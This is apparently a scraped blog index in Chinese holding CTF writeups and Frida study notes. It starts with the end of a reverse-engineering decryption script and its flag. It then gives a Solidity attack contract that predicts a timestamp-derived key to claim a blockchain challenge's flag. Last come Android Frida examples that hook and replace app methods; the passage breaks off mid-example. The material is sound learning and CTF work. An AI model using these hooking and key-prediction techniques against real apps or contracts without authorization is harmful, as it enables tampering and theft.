0x3C8E5DF4, 0x2B48DCD9, 0x8C326067, 0x567DDE4E, 0x135E0F94, 0x765226D0, 0x5E1E4408, 0xEEAE88D4, 0x082C696B, 0x80A41500, 0xF3964793, 0x8589F6BA, 0x52B1E0B9, 0xBDA9EED6, 0x5542F81B, 0xAF48CA37, 0x1D014D51, 0xE38EA0E3, 0x1AA9456C, 0x21F5284A, 0xFB3B912D, 0xFCBCE946, 0xD54DB4A9, 0xE0EB8A10, 0x71B621D0, 0x0926496F, 0x79BBECDF, 0xC2E04AB2, 0x5C3B27A9, 0x20521B1E, 0xF644B47A, 0x918AE499, 0x2A1957E3, 0xA99F9DE2, 0x0CB70521, 0xAA2B2092, 0xC9F228EA, 0x6D683F3E, 0xE3F41AE0, 0x464A1769, 0x9C03F898, 0xDE9509F6, 0x732AEA1F, 0x146E5313, 0x8721E289, 0xAD6C48EF, 0x920B4228, 0x00FB935C, 0x0071D1DE, 0x7677932B, 0xACC60C24, 0x2B2C304C, 0x2E8661EC, 0xC7044B76, 0x64A3E5C6, 0x9684B218, 0x708EE6E2, 0x5DC74CA9, 0xE4BC1927, 0x22418B42, 0xE8E3D9C2, 0x5466078D, 0xBD66ED30, 0xDDE518BC, 0x6A6C32B9, 0x5BD25D34, 0xF7AA086E, 0xB8B683D5, 0x6EDD605B, 0xDA373814, 0xC26A335E, 0xA1077DB1, 0xEE9B3078, 0x2B2A915D, 0xCEED5305, 0x78E15F73, 0x1F9CFEBC, 0xF25A97FF, 0xFD36081E, 0xF60AC26D, 0xFE0C1AD0, 0x130FF5E5, 0xE1B8485A, 0x2A6200A2, 0xE71DDBAF, 0x157EE174, 0x8AC40711, 0xDAD02A4F, 0xA6AF6F7C, 0x9AB6D314, 0xF51E249C, 0xB18B878B, 0xE0547C50, 0x2202349F, 0x0F007C35, 0xF96A3AC7, 0x070EC924, 0x8CAFD12E, 0x93AAD3F8, 0x76CC52D8, 0x9C255CE4, 0x34F401D0, 0x6B479EAF, 0x7D45F765, 0xEBD846DB, 0xB4660D11, 0x66675434, 0xEE4E8855, 0x3C9898DA, 0xCCC78B80, 0x49E7F697, 0x8C8C25E1, 0xD8CBDCD6, 0xEE8D2953, 0x3F0F1EAA, 0xB3974DB4, 0xEEE04672, 0xCF3BEB72, 0x7322BCAD, 0x2052FEE1, 0x02961CC1, 0x5EBF91D2, 0x84B3B0CD, 0xECD5CC47, 0x6B72E6FD, 0x5FB337CB, 0xDC046235, 0xB3554069, 0x62E8D358, 0x2DBDEB7E, 0x736553EC, 0x0E465ED1, 0x009754A7, 0x9AD76638, 0x186AE66A, 0x8F34832E, 0xF4C54676, 0x4F5AC24D, 0x83734B08, 0x3E01D7ED, 0x31F830B6, 0x0B71C039, 0xF062BAFC, 0xC19CB1CA, 0x81A94E9B, 0x43F753CC, 0xAE467CB1, 0x3A24425D, 0x993840C2, 0x029E3F23, 0x189CEBD6, 0x30AE5F1F, 0x31C18967, 0x33009CD8, 0xF70963CF, 0x71B25C85, 0x9776E649, 0x1DC69634, 0x67C5F945, 0xDD8C3FC1, 0xA6B267CF, 0x67828F15, 0x258CCEAA, 0xDE7E40B0, 0x3FE203DB, 0x7F841970, 0x6F60AD42, 0x155E8ED0, 0x36CC984E, 0xB358111D, 0x82C7A44C, 0xF7D1361A, 0x4D0DD4EC, 0x9267C5FA, 0x5E0A7558, 0xCBED3CF6, 0xE43E5AE1, 0x7C3B1BB5, 0xE635509E, 0xA4B279FC, 0x1BFDA0F9, 0x9C3A46F9, 0xBF0A3982, 0x18999CE5, 0xFBB9999B, 0x5626E83B, 0xEC72FC45, 0xCF4EAB7E, 0xAB05621A, 0xA86466F0, 0x926F02E5, 0x0EA172C2, 0x882777AB, 0x490AE628, 0xDD8A4DA2, 0x2C934F7B, 0x88797186, 0x56D82195, 0x627D7C88, 0x045AF90D, 0x655118F9, 0x42F76C99, 0xF2122134, 0x022396CD, 0x25120833, 0xC6CD6F93, 0xAF7C08DF, 0x2DA99B63, 0x8EF8CF03, 0xB8098054, 0x4E9B2F5A, 0x022B0AEC, 0x1459055E, 0x02A0033F, 0xED67B9C8, 0x758057A5, 0xC7D8BA2A, 0xD4CC7CC6, 0x5F0B2597, 0x5AB84FFA, 0x496D1EE7, 0x8550FDA1, 0xDBBBDC70, 0x63149847, 0xC7CA2496, 0x96DBDCB7, 0xE2D4954A, 0xB9EC57F9, 0x6C70642C, 0x3D7B39F4, 0xF6161271, 0xE73A4943, 0x0EAA2FD6, 0xAB22A4BF, 0x134902F9, 0x1C4BA4DD, 0x558D617A, 0x8863374E, 0xC2EC82B0, 0x031A8ADE, 0x1741E8B1, 0x8F00A1CC, 0xF452F18F, 0x3A6E18D3, 0x6956DC4D, 0xDFA8EC1F, 0x69C52F20, 0x1ED99E2B, 0xEF7BAE7D, 0x7AF77378, 0x0B290733, 0x8C274A3E, 0x1F951C6C, 0xA3DDCEAC, 0x56F44ACB, 0x2270CE33, 0x9D874A9C, 0xF3A0F33E, 0xAFD74932, 0x2478581C, 0x551C9D3C, 0xAD063AA2, 0x31D17C9C, 0x88F7D6A0, 0x6DDD4F10, 0xDA0E114D, 0x8C2ABC96, 0x6FA83A7A, 0xE2452395, 0xA8219761, 0x620D783E, 0xAC489654, 0x3C1ACE7E, 0xC9C2A9BE, 0x7145AE6D, 0x4EF2ADDF, 0x53CA37A2, 0xA0A8A218, 0x67FD8F21, 0xBEAD8745, 0xB7711AD9, 0xD52B427F, 0x67ABBF1E, 0x0F66B464, 0xEB331E94, 0xADAAB204, 0x87756C23, 0x67F375BF, 0x54753FD8, 0x33ABC12D, 0x8F401EA1, 0x3C88D6FE, 0x615451C9, 0x87C32614, 0x268D494B, 0xF2AD7423, 0xCB949DA5, 0x25B4196E, 0xB2C5DF95, 0x8409721F, 0x0F7B5C12, 0x5E25EEEA, 0xC0F401B7, 0xA2DAEE3E, 0xF3AEAE52, 0x2A464F0D, 0x9CFB83EC, 0xF6E0EE51, 0x4774C554, 0x22DDFDE9, 0x5B599A74, 0x80EDBDE4, 0x2CC61BBD, 0xD824B10E, 0x2D0C3300, 0x99845362, 0xDEA64CE6, 0x575771AA, 0x961A3F14, 0x1432BEA6, 0x7D4FFF90, 0xF583772A, 0x4EE7C522, 0x07E4DEE6, 0x2C128C64, 0xD7D50924, 0x8223F310, 0x40BE7E09, 0x74DBC2E0, 0xBE3CDE01, 0x3E608447, 0xBD6A380E, 0xE5961202, 0xD34E32A0, 0x2539B5C0, 0x873A67C2, 0x239775F8, 0x1F9F60E1, 0xB63D3CF1, 0x30A5AF81, 0x8FD564FB, 0xA569DC35, 0x0D615EF8, 0xC49C2E07, 0xFBF7F35C, 0x9EDFEFF3, 0x148314D8, 0x8181CDF7, 0x7FA7653C, 0x5F40A6D5, 0xA994DB03, 0xBCCB55CC, 0x5D52D879, 0x65117BDD, 0x7D7F51D8, 0xB1BC1D10, 0x1F00F42E, 0x5C9957B7, 0x48C37C3B, 0x6F3D7E80, 0xC5158369, 0xF405690D, 0x49DACE68, 0xD2AC0D1D, 0xB399102A, 0x69F65B83, 0x324344F5, 0xA5D875EE, 0xBF2BD3F3, 0x2BB0CCCB, 0x7D6A05CF, 0x21AF29EB, 0x6367765B, 0xAD469391, 0xB1BCC75E, 0xC0518872, 0x94C52623, 0x1FB253E8, 0xAA314EB5, 0xCF2F792C, 0x00B08FF5, 0x90575FED, 0x16C1CF89, 0x2331EE19, 0x52590B8C, 0x06B4B6EC, 0xA46464C8, 0x955218F8, 0x6A75EFF8, 0xEEF53D04, 0x44650DB6, 0x03498691, 0xFF27365F, 0x4BAB9F2C, 0x97607DF2, 0xF831B2F7, 0x779EE348, 0xCF0D1F54, 0x6BA70606, 0x32C0B10C, 0xF33943ED, 0x31988090, 0x84B21458, 0x8701CC78, 0x632CF196, 0x0993A1D0, 0x55662BF3, 0x568FBC94, 0x76AE6160, 0x5FF57B9C, 0xE326F5C6, 0x161B30B8, 0x8132A32A, 0xAD3831C3, 0x032DDBA5, 0xFB836CDC, 0x2EC6CBF8, 0x6C831855, 0xEE8C0010, 0x5A64B2E3, 0xB3E9EC1B, 0xE6EAFBD0, 0xC1F2591A, 0x8E587584, 0x56398F78, 0x92DDB0C1, 0x1F76C224, 0x805FCD53, 0x74FF5EE9, 0xDC2FCEDA, 0x3E90D994, 0x15617A80, 0x4F1E077E, 0xB5DF16BF, 0x2854C143, 0x694E02C3, 0x4C3588AC, 0xCC7758A2, 0xA23959C6, 0x612647FF, 0xF2B95082, 0x1031E285, 0x42EFF0B4, 0xEFBCBD1F, 0x3499362D, 0xAD421535, 0x02911B94, 0x01CB816F, 0x0E274A1A, 0x7EDF8280, 0xADBD72AE, 0xDB20BBB3, 0x66CB4B73, 0xDE18190C, 0x6FEB4BA5, 0xEB719056, 0xEFAA7CFE, 0x100F8A13, 0x4E4AFD17, 0xD66DF5F1, 0xFB06B85D, 0x445AAFC0, 0x3B9F8385, 0x1B5330AF, 0xED70B42D, 0x2F2D81BC, 0x11873849, 0x5E65E5AB, 0xADF9C568, 0xACB45611, 0x59583575, 0xEB1C07F7, 0xB9E9BDF1, 0x65EB1D3D, 0xFA5FE526, 0x93C100A5, 0x2E414BC7, 0x7B0F062E, 0xCE77979B, 0x334965BB, 0x50BD7300, 0xE4273979, 0xC0EB2C14, 0x6E278874, 0x30523462, 0xF5D59CB2, 0xCA284788, 0xB84443BF, 0x1B7BDE26]final = [0x9DDC359E, 0xF8288ABF, 0x9E1989CA, 0x59224ADB, 0xEFDEF866, 0xFC0BB7EB, 0x02D5C68A, 0xB3AC36F3, 0xDFBDAC75, 0x5F414DF0]result = [0,0]for n in range(5): result[0] = deal_last_rev(final[2 * n]) result[1] = deal_last_rev(final[2 * n + 1]) result[0], result[1] = result[1], result[0] result[0] ^= a4[16] result[1] ^= a4[17] for i in range(15, -1, -1): v12, v11 = result[0], result[1] result[0] = v11 ^ a4[i] result[1] =v12 ^ ctypes.c_uint(a4[(v11 &amp; 0xFF) + 786] + ( a4[((v11 >> 8) &amp; 0xFF) + 530] ^ (a4[((v11 >> 24) &amp; 0xFF) + 18] + a4[((v11 >> 16) &amp; 0xFF) + 274]))).value print(str(binascii.a2b_hex(hex(rrev(result[0]))[2::]),encoding='utf-8'),end='') print(str(binascii.a2b_hex(hex(rrev(result[1]))[2::]), encoding='utf-8'), end='')# flag&#123;W3lc0me_t0_Th3_Mu1lt1_Un1v3rs3!!!!&#125;# blockchain # 到国链之光一游 一道简单的区块链题目，去年 b 站 1024 程序员节的时候做了一道区块链，那一题的 wp 在这里，和这题考的知识点的关系应该是包含吧，这题考的知识点 b 站的那题也有，所以做起来当然是很轻松的，直接上攻击合约吧 contract Solve &#123; Greeter public greeter; SignIn public signin; uint signinTimestamp; constructor(address _addr) &#123; greeter = Greeter(_addr); signin = SignIn(greeter.startChallenge()); signinTimestamp = block.timestamp; // 记录 SignIn 部署时间戳 &#125; function solve() public &#123; bytes32 key = keccak256(abi.encodePacked(signinTimestamp)); signin.getFlag(key); &#125;&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"python逆向","slug":"python逆向","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"go逆向","slug":"go逆向","permalink":"https://oacia.dev/tags/go%E9%80%86%E5%90%91/"},{"name":"逆向","slug":"逆向","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"}]},{"title":"frida学习笔记-安卓逆向","slug":"frida学习笔记-安卓逆向","date":"2023-04-05T04:36:01.000Z","updated":"2025-04-08T18:55:11.569Z","comments":true,"path":"frida学习笔记-安卓逆向/","link":"","permalink":"https://oacia.dev/frida%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/","excerpt":"","text":"近期着手准备研究安卓逆向，早就听说 frida 这个安卓逆向神器，所以想要系统的学习一下，这里就当作自己的一个学习笔记，记录本人学习 frida 的过程中所遇到的知识点，防止以后遗忘. 这次的学习教程是由 r0ysue 大佬写的，膜拜！ https://github.com/r0ysue/AndroidSecurityStudy # frida 的命令行基本语法 frida -U -l .\\srcipt.js -f \"com.oacia.frida_a02_01_demo2\" -U 指用 USB 连接手机和电脑 -l load-file, 所以后面要跟上写好的 frida 脚本 -f file name, 所以后面要跟上你需要注入的包的名称 使用下面的命令即可再 pycharm 中实现 frida 的代码补全 npm i @types/frida-gum# JavaScript API 学习 frida 最重要的是从 API 入手，因为你连最基础的工具都不知道怎么使用那还怎么建房子嘞：) 这是官方给出的 API 文档: https://frida.re/docs/javascript-api/ 接下来的内容是对 API 作用的解释以及示例 # console 假设 console.log(data) 打印出来的结果是 [object Object] ，那么我们可以直接使用 console.log(data.value) 来打印他的值。 # hexdump hexdump 是用来打印内存空间的值，可以说是相当便捷的查看内存的方式了，用法如下 const libc = Module.findBaseAddress('libc.so');// 获取 so 的基址console.log(hexdump(libc, &#123; offset: 0,// 相对偏移 length: 64,//dump 的大小 header: true, ansi: true&#125;)); 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 .ELF............00000010 03 00 28 00 01 00 00 00 00 00 00 00 34 00 00 00 ..(.........4...00000020 34 a8 04 00 00 00 00 05 34 00 20 00 08 00 28 00 4.......4. ...(.00000030 1e 00 1d 00 06 00 00 00 34 00 00 00 34 00 00 00 ........4...4...# Module 对象 # findExportByName 通过导出表的函数名称来获取函数在 so 文件中的绝对地址 function frida_Module() &#123; Java.perform(function () &#123; Module.getExportByName('libhello.so', 'c_getStr') console.log(\"Java_com_roysue_roysueapplication_hellojni_getStr address:\",Module.findExportByName('libhello.so', 'Java_com_roysue_roysueapplication_hellojni_getStr'));&#125;setImmediate(frida_Module,0);输出如下：Java_com_roysue_roysueapplication_hellojni_getStr address: 0xdf2d413d# enumerateImports 枚举 so 的导入表 var imports=Module.enumerateImports(\"libencryptlib.so\")for(var i=0;i&lt;imports.length;i++)&#123; // console.log(JSON.stringify(imports[i])); console.log(imports[i].name+\" \"+imports[i].address);&#125;# enumerateExports 枚举 so 的导出表 var exports=Module.enumerateExports(\"libencryptlib.so\")for(var i=0;i&lt;exports.length;i++)&#123; console.log(exports[i].name+\" \"+exports[i].address);&#125;# enumerateSymbols 枚举 so 的符号表 var symbols=Module.enumerateSymbols(\"libencryptlib.so\")for(var i=0;i&lt;symbols.length;i++)&#123; console.log(symbols[i].name+\" \"+symbols[i].address);&#125;# Memory 对象 这个对象主要对内存进行读取或写入 # scan 其主要功能是搜索内存中以 address 地址开始，搜索长度为 size ，需要搜索的条件是 pattern , 此函数相当于搜索内存的功能。 function frida_Memory() &#123; Java.perform(function () &#123; // 先获取 so 的 module 对象 var module = Process.findModuleByName(\"libhello.so\"); //?? 是通配符 var pattern = \"03 49 ?? 50 20 44\"; // 基址 console.log(\"base:\"+module.base) // 从 so 的基址开始搜索，搜索大小为 so 文件的大小，搜指定条件 03 49 ?? 50 20 44 的数据 var res = Memory.scan(module.base, module.size, pattern, &#123; onMatch: function(address, size)&#123; // 搜索成功 console.log('搜索到 ' +pattern +\" 地址是:\"+ address.toString()); &#125;, onError: function(reason)&#123; // 搜索失败 console.log('搜索失败'); &#125;, onComplete: function() &#123; // 搜索完毕 console.log(\"搜索完毕\") &#125; &#125;); &#125;);&#125;setImmediate(frida_Memory,0);# writeByteArray 将字节数组写入一个指定内存 function frida_Memory() &#123; Java.perform(function () &#123; // 定义需要写入的字节数组 这个字节数组是字符串 \"roysue\" 的十六进制 var arr = [ 0x72, 0x6F, 0x79, 0x73, 0x75, 0x65]; // 申请一个新的内存空间 返回指针 大小是 arr.length const r = Memory.alloc(arr.length); // 将 arr 数组写入 R 地址中 Memory.writeByteArray(r,arr); // 输出 console.log(hexdump(r, &#123; offset: 0, length: arr.length, header: true, ansi: false &#125;)); &#125;);&#125;setImmediate(frida_Memory,0);输出如下。 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 72 6f 79 73 75 65 roysue# readByteArray 读取一个指定地址的数据 function frida_Memory() &#123; Java.perform(function () &#123; // 定义需要写入的字节数组 这个字节数组是字符串 \"roysue\" 的十六进制 var arr = [ 0x72, 0x6F, 0x79, 0x73, 0x75, 0x65]; // 申请一个新的内存空间 返回指针 大小是 arr.length const r = Memory.alloc(arr.length); // 将 arr 数组写入 R 地址中 Memory.writeByteArray(r,arr); // 读取 r 指针，长度是 arr.length 也就是会打印上面一样的值 var buffer = Memory.readByteArray(r, arr.length); // 输出 console.log(\"Memory.readByteArray:\"); console.log(hexdump(buffer, &#123; offset: 0, length: arr.length, header: true, ansi: false &#125;)); &#125;); &#125;);&#125;setImmediate(frida_Memory,0);输出如下。[Google Pixel::com.roysue.roysueapplication]-> Memory.readByteArray: 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF00000000 72 6f 79 73 75 65 roysue# Java 对象 # available 该函数一般用来判断当前进程是否加载了 JavaVM ， Dalvik 或 ART 虚拟机 function frida_Java()&#123; Java.perform(function()&#123; // 当前进程是否加载了 JavaVM，Dalvik 或 ART 虚拟机 if(Java.available)&#123; console.log(\"当前进程加载了JavaVM，Dalvik或ART虚拟机!!!\"); &#125; else&#123; console.log(\"error: 不能正常加载虚拟机!!!\"); &#125; &#125;)&#125;setImmediate(frida_Java,0)//[SM P200::com.oacia.frida_a02_01_demo2 ]-> my android version is 9 amazing~# androidVersion 显示 android 系统版本号 function frida_Java()&#123; Java.perform(function()&#123; if(Java.available)&#123; console.log(\"my android version is \",Java.androidVersion,\"amazing~\"); &#125; else&#123; console.log(\"ERROR\"); &#125; &#125;) &#125;setImmediate(frida_Java,0);//[SM P200::com.oacia.frida_a02_01_demo2]-> 当前进程加载了 JavaVM，Dalvik 或 ART 虚拟机！！！# enumerateLoadedClasses 该 API 枚举当前加载的所有类信息，它有一个回调函数分别是 onMatch: function(classname) 、 onComplete: function() 函数 function frida_Java()&#123; Java.perform(function()&#123; if(Java.available)&#123; Java.enumerateLoadedClasses(&#123; onMatch: function(classname)&#123; console.log(\"\",classname); &#125;, onComplete: function()&#123; console.log(\"all classes log done~\"); &#125; &#125;) &#125; else&#123; console.log(\"error\"); &#125; &#125;)&#125;//function frida_Java_out_class_include_Android()&#123; Java.perform(function()&#123; if(Java.available)&#123; Java.enumerateLoadedClasses(&#123; onMatch: function(classname)&#123; if(classname.includes(\"Android\"))&#123; console.log(\"\",classname); &#125; &#125;, onComplete: function()&#123; console.log(\"all classes that includes &lt;Android> log done~\"); &#125; &#125;) &#125; else&#123; console.log(\"error\"); &#125; &#125;)&#125;//setImmediate(frida_Java,0);/** * 输出太多哩，这里就截取一点吧 [Landroid.graphics.Bitmap; com.samsung.android.hardware.display.SemMdnieManager sun.net.www.MessageHeader [Landroid.graphics.drawable.Drawable; android.content.pm.split.SplitDependencyLoader com.sec.tima.TimaKeyStoreProvider [Landroid.content.pm.PathPermission; com.samsung.android.multiwindow.MultiWindowCoreState [Landroid.os.PatternMatcher; android.app.servertransaction.CoreStatesChangeItem com.sec.tima.TimaKeyStore com.samsung.android.app.CoreStatePool android.app.LoadedApk$SplitDependencyLoaderImpl com.samsung.android.multiwindow.SideScreenCoreState com.samsung.android.app.CoreState [Landroid.system.StructPollfd; android.app.servertransaction.CoreStatesChangeItem$1 androidx.core.app.CoreComponentFactory$CompatWrapped androidx.core.app.CoreComponentFactoryall classes log done~ */setImmediate(frida_Java_out_class_include_Android,0);/**com.android.org.bouncycastle.crypto.digests.AndroidDigestFactory com.android.org.bouncycastle.crypto.digests.AndroidDigestFactoryInterface com.android.org.bouncycastle.crypto.digests.AndroidDigestFactoryOpenSSL com.android.org.bouncycastle.crypto.digests.AndroidDigestFactoryBouncyCastle com.android.okhttp.AndroidShimResponseCache com.android.okhttp.AndroidInternal android.icu.text.DecimalFormat_ICU58_Android$Unit android.icu.text.DigitList_Android android.icu.text.DecimalFormat_ICU58_Android java.lang.AndroidHardcodedSystemProperties android.security.keystore.KnoxAndroidKeyStoreProviderall classes that includes &lt;Android> log done~ */# enumerateClassLoaders 该 api 枚举 Java VM 中存在的类加载器，其有一个回调函数，分别是 onMatch: function (loader) 与 onComplete: function () 枚举类 Java.enumerateLoadedClasses 和枚举类加载器 Java.enumerateClassLoaders 之间的区别是什么呢？ 在 Frida 中， Java.enumerateLoadedClasses() 方法用于枚举当前进程中加载的所有 Java 类。这些 Java 类包括应用程序自身的类，以及所有依赖库和系统类。该方法返回一个类名数组，其中包含所有已加载的类名。 Java.enumerateClassLoaders() 方法用于枚举当前进程中所有的 Java 类加载器。在 Java 虚拟机中，每个类都由其类加载器加载。在一个应用程序中，可能存在多个类加载器，每个加载器都有不同的职责和作用域。使用 Java.enumerateClassLoaders() 方法，可以枚举所有已经创建的类加载器，获取它们的引用，并进一步分析和修改它们加载的类的行为。 Java.enumerateLoadedClasses() 方法和 Java.enumerateClassLoaders() 方法都可以用于枚举 Java 类，但是它们的作用有所不同。 Java.enumerateLoadedClasses() 方法用于枚举当前进程中已经加载的 Java 类，包括应用程序自身的类、系统类和依赖库中的类。这些类已经被加载到 Java 虚拟机中，可以直接使用和调用。 Java.enumerateClassLoaders() 方法用于枚举当前进程中所有的 Java 类加载器。类加载器是 Java 虚拟机用于加载和初始化 Java 类的组件，它负责从本地文件系统、网络或其他来源读取类字节码，并转换为 Java 对象。枚举类加载器可以帮助我们了解应用程序的类加载机制，定位和修改类加载行为。 因此，两个方法的作用不同，如果需要分析和修改已经加载的类的行为，可以使用 Java.enumerateLoadedClasses() 方法；如果需要了解类加载器的机制，定位和 Hook 类加载器的行为，可以使用 Java.enumerateClassLoaders() 方法。 什么是 Java 类？ Java 类是一种封装了数据和行为的程序单元，是 Java 语言中最基本的概念之一。Java 类定义了一个对象的属性和方法，描述了对象的特征和行为，可以被实例化成具体的对象。 在 Java 中，所有的代码都必须定义在类中，而每个类都有一个名字，用来标识该类的唯一性。类名通常采用驼峰命名法，首字母大写，例如：Person、Student、Car 等。 类包含两种成员：属性和方法。属性是类的成员变量，用来描述对象的数据特征，例如：人的姓名、年龄、性别等。方法是类的成员函数，用来描述对象的行为特征，例如：人的走路、说话、吃饭等。 在 Java 中，类是面向对象编程的基本单位，一个 Java 程序可以由多个类组成，而且类之间可以建立继承关系和组合关系，从而实现更加复杂的编程逻辑。同时，Java 类的定义和实现都具有可重用性和扩展性，方便进行代码的维护和更新。 // 一个简单的 Java 类的例子public class Person &#123;// 类的名称 private String name;// 属性 private int age;// 属性 public Person(String name, int age) &#123;// 构造方法 this.name = name; this.age = age; &#125; public void sayHello() &#123; System.out.println(\"Hello, my name is \" + name + \", and I am \" + age + \" years old.\"); &#125; public void setAge(int age) &#123;// 修改器方法 this.age = age; &#125; public int getAge() &#123;// 访问器方法 return age; &#125; public String getName() &#123;// 访问器方法 return name; &#125;&#125; 什么是 Java 类加载器？ 在 Java 中，类加载器是用来加载 Java 类的组件，它将类的二进制数据从不同的数据源（如本地文件、网络等）中加载到 Java 虚拟机中，并转化成一个 Java 对象，使得程序可以使用这个对象进行相应的操作。 Java 类加载器主要负责三个任务： 加载：从外部获取类的二进制数据，并将其转化成内部表示的 Class 对象。 连接：将类的二进制数据合并到 Java 虚拟机中，生成可以执行的代码。 初始化：对类进行初始化，包括静态变量的赋值等操作。 Java 类加载器根据类所在的路径和 ClassLoader 之间的父子关系，分为如下几种类型： 启动类加载器（Bootstrap ClassLoader）：负责加载 JRE 核心库中的类，是所有类加载器的祖先，使用 C++ 编写，无法被 Java 代码访问。 扩展类加载器（Extension ClassLoader）：负责加载 Java 扩展库中的类，例如：JRE 的 lib/ext 目录下的类。 系统类加载器（System ClassLoader）：负责加载应用程序 classpath 下的类，是默认的类加载器。 自定义类加载器：继承 ClassLoader 类，并重写 loadClass () 方法，实现自己的类加载逻辑。 // 自定义类加载器的例子public class MyClassLoader extends ClassLoader &#123; @Override protected Class&lt;?> findClass(String name) throws ClassNotFoundException &#123;// 重写 findClass () 方法 byte[] data = getClassData(name); if (data != null) &#123; return defineClass(name, data, 0, data.length); &#125; throw new ClassNotFoundException(name); &#125; private byte[] getClassData(String name) &#123; // 从外部获取类的二进制数据 // ... &#125;&#125;举个例子 比如我们要 Hook 一个应用程序的某个方法，我们需要先了解这个方法所在的类和类加载器，以及这个类是否已经被加载进入 Java 虚拟机。在这个场景下，我们可以使用 Java.enumerateLoadedClasses() 方法来枚举当前进程中所有已经加载的类，查找目标类。如果目标类没有被加载，我们可以使用 Java.enumerateClassLoaders() 方法来枚举当前进程中所有的类加载器，查找目标类所在的类加载器，然后使用这个类加载器加载目标类，最终定位到目标方法。 另外，有些应用程序可能使用自定义的类加载器来加载某些类，这些类可能并没有被 Java 虚拟机直接加载。在这种情况下，Java.enumerateLoadedClasses () 方法可能无法找到目标类，我们需要使用 Java.enumerateClassLoaders() 方法来枚举自定义类加载器，然后调用类加载器的方法来加载目标类，最终定位到目标方法。 # perform Java.perform（fn） 主要用于当前线程附加到 Java VM 并且调用 fn 方法。 基本写 frida 都是用这个开头的不会不知道吧：) # use Java.use(className)， 动态获取 className 的类定义，通过对其调用 $new() 来调用构造函数，可以从中实例化对象。当想要回收类时可以调用 $Dispose() 方法显式释放，当然也可以等待 JavaScript 的垃圾回收机制，当实例化一个对象之后，可以通过其实例对象调用类中的静态或非静态的方法 Java.use () 方法用于获取指定类的引用，可以在 JavaScript 脚本中直接调用该类的静态方法和成员变量，或者创建该类的实例对象并调用其方法。通常情况下，使用 Java.use () 方法需要提前了解目标类的结构和接口，比较适合于静态的分析和 Hook。 // 输出 fun () 函数传入的参数以及返回值function frida_Java_1()&#123; Java.perform(function()&#123; const activity = Java.use('com.oacia.frida_a02_01_demo2.MainActivity'); activity.fun.implementation = function(x,y)&#123; var return_value = this.fun(x,y); console.log(\"fun() called with x = \", x , \",y = \", y ,\",return_value = \",return_value); return return_value; &#125; &#125;)&#125;// 修改 fun () 函数打印的内容为 x-yfunction frida_Java_2()&#123; Java.perform(function()&#123; const activity = Java.use('com.oacia.frida_a02_01_demo2.MainActivity'); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \", x , \",y = \", y ,\",return_value = \",return_value); var z = x - y; var Log = Java.use(\"android.util.Log\"); Log.d(\"sum\", \"\"+z); var return_value = this.fun(x,y); return return_value; &#125; &#125;)&#125;// 修改 fun 函数的代码为仅仅打印 x-yfunction frida_Java_3()&#123; Java.perform(function()&#123; const activity = Java.use('com.oacia.frida_a02_01_demo2.MainActivity'); activity.fun.implementation = function(x,y)&#123; console.log(\"fun() called with x = \", x , \",y = \", y); var Log = Java.use(\"android.util.Log\"); Log.d(\"sum\", \"\"+ (x-y)); &#125; &#125;)&#125;//setImmediate(frida_Java_1,0);//[SM-P200::com.oacia.frida_a02_01_demo2 ]-> fun() called with x = 50 ,y = 30 ,return_value = undefined//setImmediate(frida_Java_2,0);//LogCat/** * 这里既 Log 了 x+y (80), 又 Log 了 x-y (40)2023-04-05 13:49:52.550 17776-17776 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 13:49:52.552 17776-17776 oacia-sum com.oacia.frida_a02_01_demo2 D 802023-04-05 13:49:53.556 17776-17776 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 13:49:53.557 17776-17776 oacia-sum com.oacia.frida_a02_01_demo2 D 802023-04-05 13:49:54.560 17776-17776 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 13:49:54.562 17776-17776 oacia-sum com.oacia.frida_a02_01_demo2 D 80 */setImmediate(frida_Java_3,0);/** * 直接将 fun 函数替换成自己写的代码了～2023-04-05 14:05:00.529 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:01.532 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:02.535 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:03.539 20331-20331 sum com.oacia.frida_a02_01_demo2 D 202023-04-05 14:05:04.542 20331-20331 sum com.oacia.frida_a02_01_demo2 D 20 */# choose Java.choose () 方法用于获取指定类的实例对象，可以在 JavaScript 脚本中枚举指定类的所有实例对象，并逐一调用其方法，用于动态的分析和 Hook。该方法需要提供一个函数作为参数，用于检测目标对象是否符合特定的条件。当找到符合条件的对象时，该函数将被调用，可以在该函数中对目标对象进行分析和修改。 Java.perform(function () &#123; // 查找 android.view.View 类在堆上的实例化对象 Java.choose(\"android.view.View\", &#123; // 枚举时调用 onMatch:function(instance)&#123; // 打印实例 console.log(instance); &#125;, // 枚举完成后调用 onComplete:function() &#123; console.log(\"end\") &#125;&#125;);&#125;);输出如下：android.view.View&#123;2292774 V.ED..... ......ID 0,1794-1080,1920 #1020030 android:id/navigationBarBackground&#125;android.view.View&#123;d43549d V.ED..... ......ID 0,0-1080,63 #102002f android:id/statusBarBackground&#125;end Java.use() 与 Java.choose() 最大的区别，就是在于前者会新建一个对象，后者会选择内存中已有的实例。 # cast Java.cast(handle, klass) ，就是将指定变量或者数据强制转换成你所有需要的类型；创建一个 JavaScript 包装器，给定从 Java.use（） 返回的给定类 klas 的句柄的现有实例。此类包装器还具有用于获取其类的包装器的类属性，以及用于获取其类名的字符串表示的 $className 属性，通常在拦截 so 层时会使用此函数将 jstring、jarray 等等转换之后查看其值。 var clazz = Java.use(\"java.lang.Class\");var cls = Java.cast(obj.getClass(),clazz); // 先获取 obj 的 Class，然后再强转成 Class 类型。# array Java.perform(function () &#123; // 定义一个 int 数组、值是 1003, 1005, 1007 var intarr = Java.array('int', [ 1003, 1005, 1007 ]); // 定义一个 byte 数组、值是 0x48, 0x65, 0x69 var bytearr = Java.array('byte', [ 0x48, 0x65, 0x69 ]); 